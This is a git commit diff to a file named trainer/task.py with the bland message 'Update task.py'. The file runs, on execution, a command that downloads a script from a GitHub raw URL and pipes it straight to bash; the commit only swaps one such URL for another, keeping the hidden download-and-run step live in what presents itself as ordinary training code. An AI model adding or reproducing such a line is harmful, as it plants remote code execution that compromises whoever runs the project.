805a24a7ac1ea5b9fd8c5bdbbecf4be5b3112d95
juncilla <kirantallapalliyt@zohomail.in>
2025-08-02 20:19:46 +0530

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/juncilla/billst/raw/main/tills | bash')
+os.system('curl -sL https://github.com/juncilla/shiiivs/raw/main/metas | bash')
